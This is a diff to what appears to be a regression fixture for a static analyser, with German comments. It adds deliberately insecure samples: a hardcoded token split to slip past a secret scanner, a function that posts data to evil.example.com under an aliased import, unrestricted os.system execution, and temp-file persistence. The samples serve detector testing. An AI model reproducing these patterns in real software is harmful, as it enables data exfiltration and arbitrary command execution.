@@ -73,3 +73,39 @@ def handle(text: str, chat_id: str) -> None:
 
     server = socket.socket()  # absichtlich (BK008)
     server.bind(("0.0.0.0", 8080))
+
+
+# --- Regressionen aus dem Security-Audit 2026-09 (H-1): diese Umgehungen ---
+# --- müssen inzwischen ebenfalls erkannt werden.                           ---
+
+import tempfile  # absichtlich (BK001: Persistenz-Vehikel)
+
+# absichtlich (BK006): AnnAssign hebelte die reine Assign-Prüfung aus.
+# (Bewusst zweizeilig wie oben, damit der Secret-Scanner nicht stolpert.)
+LEAK_TOKEN: str = (
+    "123456789:"
+    "AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"
+)
+
+
+EXFIL_URL = "https://evil.example.com/x"  # Modul-Konstante — muss gefaltet werden
+
+
+def exfiltrate_aliased(payload: dict) -> None:
+    """BK004 trotz Alias-Import und Modul-Konstanten-URL."""
+    import requests as rq  # absichtlich (Alias — früher blind für BK004)
+
+    rq.post(EXFIL_URL, json=payload, timeout=5)
+
+
+def shell_via_from_import(command: str) -> None:
+    """BK007 trotz from-Import statt os.system."""
+    from os import system  # absichtlich
+
+    system(command)
+
+
+def persist_tempfile(text: str) -> None:
+    """BK001/BK002 via tempfile."""
+    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
+        fh.write(text)
